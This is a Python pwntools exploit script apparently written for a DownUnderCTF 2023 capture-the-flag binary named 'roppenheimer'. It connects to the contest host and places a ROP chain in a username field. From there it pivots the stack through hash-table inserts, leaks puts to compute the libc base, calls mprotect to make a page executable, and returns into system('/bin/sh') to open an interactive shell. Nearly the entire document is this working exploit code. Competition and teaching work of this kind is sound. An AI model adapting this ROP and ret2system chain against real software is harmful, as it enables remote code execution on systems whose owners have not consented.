#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2023.ductf.dev --port 30012 ./roppenheimer
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./roppenheimer')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2023.ductf.dev'
port = int(args.PORT or 30012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br *fire_neutron+633
br system
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
primes = [
    2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31,
    37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79,
    83, 89, 97, 103, 109, 113, 127, 137, 139, 149,
    157, 167, 179, 193, 199, 211, 227, 241, 257,
    277, 293, 313, 337, 359, 383, 409, 439, 467,
    503, 541, 577, 619, 661, 709, 761, 823, 887,
    953, 1031, 1109, 1193, 1289, 1381, 1493, 1613,
    1741, 1879, 2029, 2179, 2357, 2549, 2753, 2971,
    3209, 3469, 3739, 4027, 4349, 4703, 5087, 5503,
    5953, 6427, 6949, 7517, 8123, 8783, 9497, 10273,
    11113, 12011, 12983, 14033, 15173, 16411, 17749,
    19183, 20753, 22447, 24281, 26267, 28411, 30727,
    33223, 35933, 38873, 42043, 45481, 49201, 53201,
    57557, 62233, 67307, 72817, 78779, 85229, 92203,
    99733, 107897, 116731, 126271, 136607, 147793,
    159871, 172933, 187091, 202409, 218971, 236897,
    256279, 277261, 299951, 324503, 351061, 379787,
    410857, 444487, 480881, 520241, 562841, 608903,
    658753, 712697, 771049, 834181, 902483, 976369,
    1056323, 1142821, 1236397, 1337629, 1447153, 1565659,
    1693859, 1832561, 1982627, 2144977, 2320627, 2510653,
    2716249, 2938679, 3179303, 3439651, 3721303, 4026031,
    4355707, 4712381, 5098259, 5515729, 5967347, 6456007,
    6984629, 7556579, 8175383, 8844859, 9569143, 10352717,
    11200489, 12117689, 13109983, 14183539, 15345007,
    16601593, 17961079, 19431899, 21023161, 22744717,
    24607243, 26622317, 28802401, 31160981, 33712729,
    36473443, 39460231, 42691603, 46187573, 49969847,
    54061849, 58488943, 63278561, 68460391, 74066549,
    80131819, 86693767, 93793069, 101473717, 109783337,
    118773397, 128499677, 139022417, 150406843, 162723577,
    176048909, 190465427, 206062531, 222936881, 241193053,
    260944219, 282312799, 305431229, 330442829, 357502601,
    386778277, 418451333, 452718089, 489790921, 529899637,
    573292817, 620239453, 671030513, 725980837, 785430967,
    849749479, 919334987, 994618837, 1076067617, 1164186217,
    1259520799, 1362662261, 1474249943, 1594975441, 1725587117,
    1866894511, 2019773507, 2185171673, 2364114217, 2557710269,
    2767159799, 2993761039, 3238918481, 3504151727, 3791104843,
    4101556399, 4294967291]
def prompt(m):
    io.sendlineafter(b"> ",m)

def prompti(i):
    prompt(str(i).encode())
#N = 32
#for p in primes:
#    if (p < (2 ** 32-1)/N):
#        io = start()
#        prompt(b"skuuk")
#        for i in range(N):
#            prompt(b"1")
#            prompt(str(i*p).encode())
#            prompt(str(i).encode())
#        prompt(b"2")
#        prompt(str(p).encode())
#        log.info(io.recvuntil(b"goodbye!\n"))
#        io.close()

# stack pivot + libc leak + ret2main
pop_rdi_rbp = 0x4025e0
pop_rsp_rbp = 0x404ac7
ret = 0x40201a
rop = [0,pop_rdi_rbp, exe.got.puts, 0, exe.plt.puts, exe.sym.main]

io = start()
prompt(b"".join([p64(g) for g in rop])) # putting rop chain in username

# cursed shenanigans to pivot the stack
good_prime = 59
offset = 0x409eac
for i in range(32):
    prompti(1)
    if i == 24:
        prompti(offset + good_prime*i)
        prompti(2)
    else:
        prompti(offset + good_prime*i)
        prompti(pop_rsp_rbp)
prompti(2)
prompti(offset)

# computing libc address from the puts leak
l = io.recvuntil(b"research").split(b"atomic ")[0][-7:-1]
puts_addr = unpack(l,'all')
log.info(f"puts : 0x{puts_addr:x}")
libc = exe.libc
libc.address = puts_addr - libc.sym.puts
log.info((f"libc : 0x{libc.address:x}"))

# ret2system with a detour via mprotect to arrange page permissions in the executable
pop_rdi = libc.address + 0x2a3e5
pop_rsi = libc.address + 0xda97d
pop_rdx_rbx = libc.address + 0x90529

m_addr = 0x409000
m_len = 0x1000
prot = 0x7

rop_mprotect = p64(pop_rdi) + p64(m_addr) + p64(pop_rsi) + p64(m_len) + p64(pop_rdx_rbx) + p64(prot)*2 + p64(libc.sym.mprotect)
rop2 = rop_mprotect + p64(pop_rdi_rbp) +p64(next(libc.search(b'/bin/sh\x00')))*2 + p64(ret) + p64(libc.sym.system)

prompt(b"a"*16 +rop2)

io.interactive()

